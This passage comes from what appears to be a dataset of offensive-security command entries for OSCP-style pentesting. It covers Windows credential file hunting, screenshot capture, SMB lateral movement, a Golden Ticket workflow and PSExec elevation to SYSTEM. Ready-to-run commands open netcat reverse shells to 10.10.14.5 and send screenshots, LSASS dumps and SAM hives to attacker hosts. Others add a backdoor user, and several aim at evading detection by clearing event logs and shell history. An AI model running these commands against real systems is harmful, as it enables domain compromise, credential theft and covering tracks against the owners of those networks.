# Often contains: net use commands with passwords, psexec with credentials, etc.

Web.config (database passwords):
type C:\inetpub\wwwroot\web.config
findstr /si password C:\inetpub\wwwroot\*.config

SAM backup (registry hives):
dir /s /b C:\Windows\repair\SAM C:\Windows\System32\config\RegBack\SAM
# If found, extract with impacket-secretsdump

FileZilla credentials:
type ""C:\Program Files\FileZilla Server\FileZilla Server.xml""
type ""%APPDATA%\FileZilla\recentservers.xml""

EXTRACTING CREDENTIALS FROM CONFIG FILES:

Web.config connection strings:
<connectionStrings>
  <add name=""DefaultConnection"" connectionString=""Server=localhost;Database=myDB;User Id=sa;Password=P@ssw0rd123;"" />
</connectionStrings>

Unattend.xml local admin password:
<UserAccounts>
  <LocalAccounts>
    <LocalAccount wcm:action=""add"">
      <Password>
        <Value>UABhAHMAcwB3AG8AcgBkADEAMgAzACEA</Value>
        <PlainText>false</PlainText>
      </Password>
      <Name>Administrator</Name>
    </LocalAccount>
  </LocalAccounts>
</UserAccounts>
# Base64 decode: echo UABhAHMAcwB3AG8AcgBkADEAMgAzACEA | base64 -d

Final Recommendations:
1. Start with user profiles: C:\Users\*password*
2. Check web apps: C:\inetpub\wwwroot\*.config
3. PowerShell history: ConsoleHost_history.txt
4. Unattend.xml: C:\Windows\Panther\Unattend.xml
5. FileZilla: C:\Program Files\FileZilla Server\FileZilla Server.xml
6. Registry backups: C:\Windows\repair\SAM

TIME ESTIMATE:
User profiles search: 30 seconds - 2 minutes
Full C: drive search: 5-30 minutes (not recommended)
Targeted searches (specific directories): 10-60 seconds each","high","","","","{""Access is denied (many directories)"": ""Low privileges. Solution: Expected for system directories (C:\\Windows\\System32\\config, etc.) - skip these. Focus on user directories: dir /s /b C:\\Users\\*password*. Or elevate to SYSTEM: psexec -s -i cmd, then retry."", ""File Not Found / no results"": ""No obvious credential files. Solution: Expand search terms: dir /s /b C:\\*pass* C:\\*pwd* C:\\*key* C:\\*secret* C:\\*backup*. Search specific high-value locations: C:\\Users\\, C:\\inetpub\\, C:\\Program Files\\. Use PowerShell for content search (not just filename): Get-ChildItem C:\\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password'."", ""Too many results (thousands of files)"": ""Generic search terms match too much. Solution: Filter by extension: dir /s /b C:\\*.txt C:\\*.xml C:\\*.config | findstr /i password. Or search user profiles only: dir /s /b C:\\Users\\*password*."", ""Search takes forever (hours)"": ""Entire C: drive scan is slow. Solution: Target specific directories: dir /s /b C:\\Users\\%USERNAME%\\*password*. Or C:\\inetpub\\wwwroot\\*.config. Or C:\\Program Files\\<AppName>\\*.xml. Skip system directories: exclude C:\\Windows\\, C:\\ProgramData\\."", ""dir command not found (rare)"": ""PATH variable broken. Solution: Use full path: C:\\Windows\\System32\\cmd.exe /c dir /s /b C:\\*password*. Or use PowerShell alternative: Get-ChildItem C:\\ -Recurse -Include *password*,*cred* -ErrorAction SilentlyContinue.""}","{""dir"": ""Windows directory listing command. With /s flag, searches recursively through all subdirectories. ALTERNATIVE: Get-ChildItem (PowerShell equivalent) with -Recurse flag."", ""/s"": ""Recurse subdirectories - searches entire directory tree starting from specified paths. CRITICAL for comprehensive file discovery. Without /s, only searches current directory."", ""/b"": ""Bare format - displays filenames only (no size, date, attributes). Makes output easier to parse and grep. Alternative: /a for detailed attributes."", ""C:\\*password*"": ""Wildcard search for files with 'password' anywhere in filename. Examples found: passwords.txt, password_backup.xlsx, app_passwords.config. Case-insensitive on Windows."", ""C:\\*cred*"": ""Search for 'cred' - finds: credentials.xml, cred.txt, stored_credentials.dat, etc."", ""C:\\*vnc*"": ""VNC credential files - VNC servers store passwords in registry or .vnc files (often weakly encrypted). Examples: ultravnc.ini, vnc_config.xml."", ""C:\\*.config"": ""Configuration files - often contain database connection strings, API keys, service account passwords in plaintext. Examples: web.config, app.config, hibernate.cfg.xml.""}","","[""powerview-find-localadminaccess"", ""ps-search-credentials""]","[""windows-hashcat-crack-ntlm"", ""ad-lsass-dump-procdump"", ""ad-sam-dump-reg-save""]"
"windows-screenshot-capture","Capture Screenshot (RDP/GUI Session)","post-exploit","powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('C:\Temp\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose()""","Capture screenshot of current desktop session. Useful for documenting GUI-based findings, reading sensitive information displayed on screen, or proving access during engagements.","situational-awareness","","USEFUL FOR DOCUMENTATION and discovering GUI-based secrets. OSCP USE CASES: (1) Capture proof.txt contents displayed on desktop, (2) Document application GUI settings revealing credentials, (3) Screenshot password manager vaults, (4) Capture Sticky Notes with passwords. REQUIREMENTS: Active desktop session (RDP, console, or VNC) - doesn't work over SSH/WinRM/PSExec without -i. File size: ~1-5MB for typical resolution. OPSEC: Delete screenshot after exfiltration to avoid leaving forensic artifacts. Time estimate: 2-5 seconds (capture + save).

MANUAL ALTERNATIVES:

Full PowerShell one-liner:
powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('C:\Temp\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose()""

Save to user temp (more stealthy):
powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('$env:TEMP\s.png', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose()""

JPEG format (smaller file size):
powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('C:\screenshot.jpg', [System.Drawing.Imaging.ImageFormat]::Jpeg); $bitmap.Dispose(); $graphics.Dispose()""

NirCmd alternative (smaller executable):
nircmd.exe savescreenshot C:\screenshot.png
# Download nircmd.exe from NirSoft: https://www.nirsoft.net/utils/nircmd.html

Snipping Tool automation (Windows built-in):
%windir%\System32\SnippingTool.exe /clip
# Copies screenshot to clipboard - paste into Paint and save

PowerShell script file (for repeated captures):
# screenshot.ps1
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)

$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)

$timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$filename = ""screenshot_$timestamp.png""
$bitmap.Save(""C:\Temp\$filename"", [System.Drawing.Imaging.ImageFormat]::Png)

$bitmap.Dispose()
$graphics.Dispose()

Write-Host ""Screenshot saved: C:\Temp\$filename""

Execute: powershell -ExecutionPolicy Bypass -File screenshot.ps1

Multiple monitor capture (all screens):
powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bitmap.Save('C:\Temp\screenshot_all.png'); $bitmap.Dispose(); $graphics.Dispose()""

Continuous monitoring (take screenshot every 30 seconds):
while ($true) {
  $timestamp = Get-Date -Format 'yyyyMMdd_HHmmss'
  # (screenshot capture code)
  Start-Sleep -Seconds 30
}

FILE TRANSFER AFTER CAPTURE:

SMB transfer:
copy C:\Temp\screenshot.png \\<LHOST>\share\

HTTP upload (PowerShell):
Invoke-WebRequest -Uri http://<LHOST>:8080/upload -Method POST -InFile C:\Temp\screenshot.png

Base64 encode and paste:
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\screenshot.png')) | Out-File C:\Temp\screenshot.txt
type C:\Temp\screenshot.txt
# Copy output, decode on Kali: base64 -d > screenshot.png

FTP upload:
echo open <LHOST> > ftp.txt
echo user anonymous anonymous >> ftp.txt
echo binary >> ftp.txt
echo put C:\Temp\screenshot.png >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt

USE CASES:

1. Proof of access:
- Screenshot desktop showing machine name + proof.txt contents
- For OSCP: ipconfig /all + type proof.txt in same window

2. Password managers:
- Open KeePass, LastPass, 1Password GUI  screenshot
- Often reveals master password or stored credentials

3. Sticky Notes:
- Windows Sticky Notes often contain passwords
- Screenshot desktop if notes visible

4. Application credentials:
- Database management tools (SQL Server Mgmt Studio, MySQL Workbench)
- FTP clients (FileZilla, WinSCP) showing saved sessions
- Email clients with credential cache

5. Browser saved passwords:
- Open browser password manager  screenshot
- Chrome: chrome://settings/passwords
- Firefox: about:logins

6. Ongoing user activity:
- Monitor what user is currently doing
- Capture sensitive documents being edited
- Identify applications in use (exploit research targets)

CLEANUP:

Delete screenshot after exfiltration:
del C:\Temp\screenshot.png

Clear PowerShell history:
Remove-Item (Get-PSReadlineOption).HistorySavePath

TIME ESTIMATE:
Screenshot capture: 1-2 seconds
File save: <1 second
File transfer (SMB): 2-10 seconds (depends on size and connection)
Total: 3-13 seconds","medium","","","","{""No desktop session detected"": ""No active GUI session. Solution: Screenshot requires interactive session (RDP, console, VNC). Doesn't work over: WinRM, SSH, PSExec without -i flag, WMIExec. Use RDP: xfreerdp /u:<user> /p:<pass> /v:<target>. Or PSExec with interaction: psexec.exe -i -s cmd (launches interactive session)."", ""Access to the path is denied"": ""Cannot write to C:\\Temp\\. Solution: Use alternate writable directory: %TEMP%\\screenshot.png (user temp), C:\\Users\\Public\\screenshot.png (public folder), %APPDATA%\\screenshot.png (user AppData). Or create temp directory: mkdir C:\\Temp && (save screenshot)."", ""Exception calling CopyFromScreen"": ""Graphics driver issue or RDP session not fully initialized. Solution: Retry command. Wait 5-10 seconds after RDP connection. Or use alternate tool: nircmd.exe savescreenshot screenshot.png (NirSoft utility)."", ""PowerShell version too old"": ""PowerShell 2.0 may have issues. Solution: Upgrade PowerShell (if possible) or use alternate method: nircmd.exe, Windows Snipping Tool automation, or VBScript screenshot."", ""Bitmap.Save fails with ArgumentException"": ""Invalid file path or permissions. Solution: Use simple path without spaces: C:\\screenshot.png. Or ensure directory exists: New-Item -Path C:\\Temp\\ -ItemType Directory -Force; (save screenshot).""}","{""Add-Type -AssemblyName System.Windows.Forms"": ""Load .NET Windows Forms library for screen access. Provides Screen class to get display information."", ""[System.Windows.Forms.Screen]::PrimaryScreen.Bounds"": ""Get primary monitor dimensions (width, height, position). For multi-monitor, captures only primary display."", ""New-Object System.Drawing.Bitmap"": ""Create in-memory bitmap image object with screen dimensions. Image stored in RAM before saving to disk."", ""$graphics.CopyFromScreen()"": ""Capture screen content into bitmap. Copies pixel data from display buffer. Requires active desktop session (doesn't work over SSH/WinRM, only RDP/console)."", ""$bitmap.Save('C:\\\\Temp\\\\screenshot.png')"": ""Save bitmap to PNG file. Can use any writable directory. PNG format provides good compression without quality loss. Alternative formats: JPEG (smaller file), BMP (larger file)."", ""C:\\\\Temp\\\\screenshot.png"": ""Output file path. Use writable directory like C:\\Temp\\, C:\\Users\\Public\\, or %TEMP%. OPSEC: Delete after exfiltration.""}","","",""
"windows-net-use-smb-connect","Map Network Drive with net use","post-exploit","net use \\<TARGET>\<SHARE> /user:<DOMAIN>\<USERNAME> <PASSWORD>","Authenticate to remote SMB share and map network drive. Used to access remote file systems after credential discovery or for Golden Ticket validation.","lateral-movement","net use \\DC1.corp.com\C$ /user:CORP\administrator P@ssw0rd!","COMMON POST-EXPLOITATION task for file access and Golden Ticket validation. OSCP USE CASES: (1) Access remote C$ share after discovering credentials, (2) Validate Golden Ticket works: net use \\\\DC1\C$ (with ticket loaded), (3) Browse file shares for sensitive files, (4) Copy exploit tools to remote systems. OPSEC WARNING: Password in command line logged in Event ID 4688 and visible in process monitor. Use PowerShell SecureString for stealth. Credentials cached in LSASS after successful connection (extractable with Mimikatz). Time estimate: 2-5 seconds.

MANUAL ALTERNATIVES:

Basic connection:
net use \\\\<TARGET>\C$ /user:CORP\administrator P@ssw0rd!

With drive letter mapping:
net use Z: \\\\<TARGET>\C$ /user:CORP\administrator P@ssw0rd!
dir Z:\

Temporary connection (no persistence):
net use \\\\<TARGET>\C$ /user:CORP\administrator P@ssw0rd! /persistent:no

Local account authentication:
net use \\\\<TARGET>\C$ /user:.\administrator P@ssw0rd!

List all network connections:
net use

Disconnect specific share:
net use \\\\<TARGET>\C$ /delete

Disconnect all shares:
net use * /delete /y

PowerShell (more secure - no password in command line):
$pass = ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('CORP\administrator', $pass)
New-PSDrive -Name Z -PSProvider FileSystem -Root \\\\<TARGET>\C$ -Credential $cred

Pushd (temporary mapping, auto-unmounts when popd):
pushd \\\\<TARGET>\C$
dir
popd

Access without mapping (direct UNC):
dir \\\\<TARGET>\C$\Users
type \\\\<TARGET>\C$\Users\Administrator\Desktop\proof.txt

COMMON SMB SHARES:

Admin shares (require admin rights):
C$ - C: drive root
ADMIN$ - C:\Windows
IPC$ - Inter-process communication (null session testing)

Domain shares:
SYSVOL - Domain Group Policy and scripts (\\\\DC\SYSVOL\<domain>\)
NETLOGON - User logon scripts (\\\\DC\NETLOGON)

Custom shares:
net view \\\\<TARGET> (list available shares)
net share (on target - list local shares)

GOLDEN TICKET VALIDATION:

1. Create Golden Ticket with Mimikatz/ticketer.py
2. Load ticket: klist purge && klist add ticket.kirbi (Mimikatz) OR export KRB5CCNAME=ticket.ccache (Linux)
3. Test access: net use \\\\DC1.corp.com\C$
4. Should succeed WITHOUT /user and password flags (Kerberos auth)

FILE OPERATIONS AFTER CONNECTION:

List files:
dir \\\\<TARGET>\C$\Users\Administrator\Desktop\

Copy file from target:
copy \\\\<TARGET>\C$\Users\Administrator\Desktop\proof.txt C:\proof.txt

Copy file to target:
copy nc.exe \\\\<TARGET>\C$\Windows\Temp\

Execute remote binary (with psexec):
psexec \\\\<TARGET> -u <DOMAIN>\<USER> -p <PASS> cmd /c ""C:\Windows\Temp\nc.exe -e cmd 10.10.14.5 4444""

Search remote files:
dir /s /b \\\\<TARGET>\C$\*password*

MOUNT VS DIRECT ACCESS:

Mount (with drive letter):
net use Z: \\\\<TARGET>\C$
dir Z:\Users
copy Z:\Users\admin\passwords.txt C:\

Direct UNC access (no drive letter):
dir \\\\<TARGET>\C$\Users
copy \\\\<TARGET>\C$\Users\admin\passwords.txt C:\

Direct access advantages:
- No drive letter required
- Less suspicious (no registry changes)
- Works in scripts without mount/unmount

Drive letter advantages:
- Some tools require drive letters (not UNC paths)
- Easier for repetitive access
- Tab completion in cmd.exe

CREDENTIAL CACHING:

After net use, credentials stored in:
1. LSASS process memory (extract with Mimikatz)
2. Windows Credential Manager: rundll32.exe keymgr.dll,KRShowKeyMgr
3. Registry: HKCU\Network (mapped drives)

Extract cached credentials:
mimikatz.exe ""sekurlsa::logonpasswords"" ""exit""
# Shows credentials used for net use connections

CLEANUP:

Disconnect share:
net use \\\\<TARGET>\C$ /delete

Clear stored credentials:
cmdkey /delete:<TARGET>
control userpasswords2 (GUI cleanup)

Clear PowerShell history:
Remove-Item (Get-PSReadlineOption).HistorySavePath

TIME ESTIMATE:
Connection: 2-5 seconds
File listing: 1-2 seconds
File transfer: Variable (depends on size)","medium","","","","{""System error 5 (Access denied)"": ""User lacks permissions for share. Solution: Verify credentials with crackmapexec: crackmapexec smb <TARGET> -u <USER> -p <PASS>. Check share permissions: net share (on target). Try different share: net use \\\\\\\\<TARGET>\\IPC$ instead of C$. Verify admin rights: net localgroup administrators (on target)."", ""System error 53 (Network path not found)"": ""Cannot reach target or share doesn't exist. Solution: Ping target: ping <TARGET>. Verify SMB port: nmap -p 445 <TARGET>. List available shares: net view \\\\\\\\<TARGET>. Check DNS resolution: nslookup <TARGET>. Try IP instead of hostname."", ""System error 1326 (Bad username/password)"": ""Invalid credentials. Solution: Verify password case sensitivity. Try domain formats: DOMAIN\\user vs user@domain.com. Test with smbclient: smbclient -L //<TARGET> -U <DOMAIN>/<USER>%<PASS>. Check account not locked: crackmapexec smb <TARGET> -u <USER> -p '' (check if account exists)."", ""System error 1219 (Multiple connections)"": ""Already connected to target with different credentials. Solution: Disconnect existing connections: net use \\\\\\\\<TARGET> /delete. List all connections: net use. Disconnect all: net use * /delete /y. Then retry connection."", ""Special characters in password break command"": ""Command line parsing issues. Solution: Use PowerShell alternative: $pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\\<USER>', $pass); New-PSDrive -Name Z -PSProvider FileSystem -Root \\\\\\\\<TARGET>\\C$ -Credential $cred""}","{""net use"": ""Windows network resource connection command. Creates authenticated SMB session to remote share. CRITICAL: Credentials cached in LSASS after successful connection (can be dumped with Mimikatz). Alternative: New-PSDrive (PowerShell), pushd (temporary mapping)."", ""\\\\\\\\<TARGET>\\\\<SHARE>"": ""UNC path to remote share. FORMAT: \\\\\\\\hostname\\sharename. Common shares: C$ (admin share for C: drive), ADMIN$ (C:\\Windows), IPC$ (inter-process communication), SYSVOL (domain shares), NETLOGON (logon scripts). Custom shares: \\\\\\\\server\\Data, \\\\\\\\server\\Backup, etc."", ""/user:<DOMAIN>\\\\<USERNAME>"": ""Authentication credentials. FORMAT: DOMAIN\\username or .\\username (local). Examples: /user:CORP\\administrator (domain admin), /user:.\\administrator (local admin), /user:CORP.COM\\user@corp.com (UPN format)."", ""<PASSWORD>"": ""Plaintext password. OPSEC WARNING: Password appears in command line (logged in Event ID 4688, visible in process list). For stealth, use PowerShell SecureString or runas /netonly."", ""Optional: /persistent:no"": ""Don't persist connection after reboot. Default: /persistent:yes (reconnects at logon). Use /persistent:no for temporary connections during engagement."", ""Optional: <DRIVE_LETTER>:"": ""Assign drive letter. Example: net use Z: \\\\\\\\<TARGET>\\C$ /user:<USER> <PASS>. Access as Z:\\ instead of full UNC path. Useful for scripts expecting drive letters.""}","","[""ad-pass-the-hash-impacket-psexec"", ""ad-pass-the-hash-impacket-wmiexec""]",""
"kerberos-klist-purge","Clear Kerberos Ticket Cache","post-exploit","klist purge","Delete all Kerberos tickets from current user's ticket cache. Used to clear old tickets before loading Golden/Silver tickets or to reset authentication state.","kerberos","","ESSENTIAL STEP before Golden/Silver Ticket attacks. OSCP WORKFLOW: (1) Purge existing tickets: klist purge, (2) Load Golden Ticket: Mimikatz kerberos::ptt golden.kirbi OR Rubeus.exe ptt /ticket:golden.kirbi, (3) Verify: klist (should show new TGT), (4) Access resources: net use \\\\DC1\C$ (Kerberos auth, no password needed). WHY PURGE: Old TGTs may have expired or conflicting SIDs - purging ensures clean ticket cache. Time estimate: <1 second.

MANUAL ALTERNATIVES:

Purge all tickets (Windows):
klist purge

View current tickets before purge:
klist
# Shows: Client, Server, KerbTicket Encryption Type, Ticket Flags, Start/End Time

Mimikatz purge:
mimikatz.exe ""kerberos::purge"" ""exit""

Rubeus purge:
Rubeus.exe purge

Purge specific LUID (logon session):
Rubeus.exe purge /luid:0x3e7

GOLDEN TICKET WORKFLOW:

Complete Golden Ticket attack sequence:

1. DCSync to get krbtgt hash:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'
# Output: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693d5e6f1532e6d0e2d5e4b1a9f5ebb:::

2. Get Domain SID:
lookupsid.py 'corp.com/admin:pass@192.168.50.70' | grep ""Domain SID""
# Output: S-1-5-21-1987370270-658905905-1781884369

3. Create Golden Ticket (Kali):
ticketer.py -nthash 1693d5e6f1532e6d0e2d5e4b1a9f5ebb -domain-sid S-1-5-21-1987370270-658905905-1781884369 -domain corp.com Administrator
# Creates: Administrator.ccache

4. Use ticket on Kali (Linux):
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.com/Administrator@DC1.corp.com

5. Use ticket on Windows:
# Transfer ticket to Windows target
# Convert ccache to kirbi if needed (Kerberos ticket converter)
mimikatz.exe ""kerberos::purge"" ""kerberos::ptt Administrator.kirbi"" ""exit""
klist # Verify ticket loaded
net use \\\\DC1\C$ # Test access

klist COMMAND USAGE:

List all tickets:
klist

List specific logon session:
klist -li 0x3e7

List ticket for specific target:
klist -li 0:0x3e4 <SPN>

Ticket cache location:
klist sessions # Shows all logon sessions

VERIFY GOLDEN TICKET:

After loading Golden Ticket:
klist
# Should show:
# Client: Administrator @ CORP.COM
# Server: krbtgt/CORP.COM @ CORP.COM
# KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
# Start Time / End Time / Renew Time

Test access:
net use \\\\DC1.corp.com\C$
# Should succeed WITHOUT username/password (Kerberos auth)

List remote directory:
dir \\\\DC1.corp.com\C$\Users

PsExec with ticket:
psexec.exe \\\\DC1.corp.com cmd
# Opens SYSTEM shell on DC (no password required)

TROUBLESHOOTING GOLDEN TICKETS:

Ticket not working:
1. Verify ticket loaded: klist (should show TGT)
2. Check ticket validity period: klist (Start/End Time)
3. Verify domain name matches: klist (should show correct domain)
4. Ensure clock sync: net time \\\\DC1 (< 5 min skew)
5. Test with specific service: net use \\\\DC1\ADMIN$

Clock skew error:
KRB_AP_ERR_SKEW - Time difference > 5 minutes
Solution:
- Sync time: net time \\\\DC1 /set /yes
- Or ntpdate: w32tm /resync /force

Wrong SID in ticket:
Access denied despite valid ticket
Solution:
- Verify Domain SID: lookupsid.py
- Recreate ticket with correct SID

Ticket expired:
klist shows past End Time
Solution:
- Create new ticket with longer validity
- ticketer.py -duration <days>

OPSEC:

klist leaves minimal logs:
- No specific Event ID for klist purge
- TGT requests logged (Event ID 4768) when new ticket used
- TGS requests logged (Event ID 4769) when accessing services

Golden Ticket detection:
- Look for TGT with unusual lifetime (e.g., 10 years)
- Monitor for TGT creation outside normal authentication
- Check for krbtgt password hash reuse

Mitigation:
- Rotate krbtgt password twice (invalidates all Golden Tickets)
- Monitor Event ID 4769 for anomalous service ticket requests
- Implement privileged account protections (PAM)

TIME ESTIMATE:
klist purge: <1 second
Golden Ticket creation: 5-10 seconds
Ticket injection: 2-5 seconds
Total workflow: 15-30 seconds","medium","","","","{""klist command not found"": ""Windows path issue (extremely rare). Solution: Use full path: C:\\Windows\\System32\\klist.exe purge. Verify Windows version: klist is built into Windows 2000+. If truly missing, use Mimikatz alternative: mimikatz.exe 'kerberos::purge' exit."", ""Tickets still present after purge"": ""May have system-level tickets or protected tickets. Solution: Run from elevated prompt: Run as Administrator \u2192 klist purge. Or use Mimikatz with privilege::debug: mimikatz.exe 'privilege::debug' 'kerberos::purge' 'exit'."", ""Cannot purge specific ticket"": ""klist purge deletes ALL tickets - no selective deletion in Windows klist. Solution: For selective deletion, use Mimikatz: mimikatz.exe 'kerberos::list' (note ticket ID) 'kerberos::purge /ticket:<ID>' 'exit'. Or Rubeus: Rubeus.exe purge /luid:<LUID>.""}","{""klist"": ""Windows Kerberos ticket list and management utility. Built-in Windows tool (no installation required). Shows current Kerberos TGTs (Ticket Granting Tickets) and TGSs (Service Tickets) in user's credential cache."", ""purge"": ""Delete ALL Kerberos tickets from current session. Clears both TGTs and TGSs. CRITICAL before loading Golden/Silver tickets - ensures old tickets don't interfere. Equivalent to Linux: kdestroy or Mimikatz: kerberos::purge.""}","","","[""ad-golden-ticket-mimikatz-create"", ""ad-golden-ticket-rubeus-create"", ""ad-silver-ticket-mimikatz-create""]"
"windows-psexec-system-shell","Get SYSTEM Shell with PSExec","post-exploit","psexec.exe -accepteula -s -i cmd.exe","Elevate from Administrator to SYSTEM privileges using Sysinternals PSExec. Creates interactive command prompt running as NT AUTHORITY\SYSTEM - highest privilege level on Windows.","privilege-escalation","","CRITICAL OSCP TECHNIQUE - elevate Administrator  SYSTEM for sensitive operations. WHEN TO USE: (1) Before dumping LSASS (procdump requires SYSTEM), (2) Before dumping SAM (reg save SAM requires SYSTEM or high-integrity admin), (3) Accessing protected files/registry, (4) Bypassing security restrictions. REQUIREMENTS: Must already be Administrator (check: whoami /groups). SYSTEM privileges enable: LSASS access, SAM access, all file system, all registry, debug privileges, impersonation. Time estimate: 2-5 seconds.

MANUAL ALTERNATIVES:

Basic SYSTEM shell:
psexec.exe -accepteula -s -i cmd.exe
whoami # Should show: nt authority\system

SYSTEM PowerShell (recommended for post-exploitation):
psexec.exe -accepteula -s -i powershell.exe

Run single command as SYSTEM:
psexec.exe -accepteula -s cmd /c ""whoami""

Mimikatz token elevation (alternative):
mimikatz.exe ""privilege::debug"" ""token::elevate"" ""exit""
# Elevates current process to SYSTEM

PowerShell Start-Process (requires GUI):
Start-Process cmd.exe -Verb RunAs
# UAC prompt appears - approve to get elevated shell

Service creation (manual SYSTEM escalation):
sc create EvilService binPath= ""cmd.exe /c net user hacker P@ss123 /add"" start= auto
sc start EvilService
# Service runs as SYSTEM by default

COMMON OSCP WORKFLOW:

1. Get Administrator shell:
psexec.py 'corp.com/admin:pass@192.168.50.75'

2. Upload PSExec:
copy \\10.10.14.5\share\psexec.exe C:\Windows\Temp\

3. Elevate to SYSTEM:
C:\Windows\Temp\psexec.exe -accepteula -s -i cmd.exe

4. Verify SYSTEM:
whoami
whoami /priv # Should show SeDebugPrivilege

5. Dump LSASS:
C:\Windows\Temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp

6. Dump SAM:
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

7. Exfiltrate to Kali:
copy lsass.dmp \\10.10.14.5\share\
copy sam.hive \\10.10.14.5\share\
copy system.hive \\10.10.14.5\share\

8. Process on Kali:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
pypykatz lsa minidump lsass.dmp

VERIFY SYSTEM PRIVILEGES:

Check user:
whoami
# Output: nt authority\system

Check groups:
whoami /groups
# Should show:
# BUILTIN\Administrators
# NT AUTHORITY\SYSTEM
# MANDATORY LABEL\System Mandatory Level

Check privileges:
whoami /priv
# SYSTEM has ALL privileges:
# SeDebugPrivilege (debug programs - access LSASS)
# SeTakeOwnershipPrivilege (take ownership of any file)
# SeBackupPrivilege (backup files - bypass ACLs)
# SeRestorePrivilege (restore files)
# SeLoadDriverPrivilege (load kernel drivers)
# SeImpersonatePrivilege (impersonate tokens)

Test file access:
type C:\Windows\System32\config\SAM
# Should work (SAM readable only by SYSTEM)

Test LSASS access:
tasklist | findstr lsass
# Note PID
procdump.exe -accepteula -ma <PID> lsass.dmp
# Should succeed

SYSTEM VS ADMINISTRATOR:

Administrator:
- High privileges but not highest
- Cannot access LSASS memory directly (blocked by PPL on modern systems)
- Cannot read SAM database directly (even with admin rights)
- Subject to some UAC restrictions
- Can elevate to SYSTEM using PSExec/token manipulation

SYSTEM:
- Highest privilege level (higher than Administrator)
- Can access ALL processes including LSASS
- Can read ALL files including SAM database
- Bypasses UAC completely
- No password (service account)
- Cannot be used for network authentication (use $ machine account)

USE CASES FOR SYSTEM:

1. LSASS dumping:
psexec.exe -s -i cmd.exe
procdump.exe -ma lsass.exe lsass.dmp

2. SAM dumping:
psexec.exe -s -i cmd.exe
reg save HKLM\SAM sam.hive

3. Protected file access:
psexec.exe -s -i cmd.exe
type C:\Windows\System32\config\SAM

4. Service manipulation:
psexec.exe -s -i cmd.exe
sc config <service> binPath= ""C:\evil.exe""

5. Driver loading:
psexec.exe -s -i cmd.exe
sc create EvilDriver type= kernel binPath= C:\driver.sys
sc start EvilDriver

6. Token impersonation:
psexec.exe -s -i powershell.exe
# Load Invoke-TokenManipulation
Invoke-TokenManipulation -CreateProcess ""cmd.exe"" -Username ""DOMAIN\Administrator""

OPSEC:

psexec.exe execution logged:
- Event ID 4688 (process creation)
- Event ID 7045 (service creation) - psexec creates PSEXESVC service
- Sysmon Event ID 1 (process creation)
- Sysmon Event ID 13 (registry modification) for service creation

AV considerations:
- PSExec is Microsoft-signed (usually allowed by AV)
- Some EDR flag PSExec for privilege escalation
- Alternative: Mimikatz token elevation (more stealthy, no service creation)

Cleanup:
- psexec.exe auto-deletes PSEXESVC service on exit
- Delete psexec.exe after use: del C:\Windows\Temp\psexec.exe
- Clear Event Logs (if SYSTEM): wevtutil cl System && wevtutil cl Security

ALTERNATIVE SYSTEM ELEVATION:

1. Mimikatz token elevation:
mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # exit
# Current process now SYSTEM

2. Service creation:
sc create EvilSvc binPath= ""cmd /c C:\nc.exe 10.10.14.5 4444 -e cmd"" start= auto
sc start EvilSvc
# Service runs as SYSTEM, connects back

3. Scheduled task as SYSTEM:
schtasks /create /tn EvilTask /tr ""cmd /c C:\evil.exe"" /sc once /st 00:00 /ru SYSTEM
schtasks /run /tn EvilTask

4. AT command (older Windows):
at 13:37 C:\evil.exe
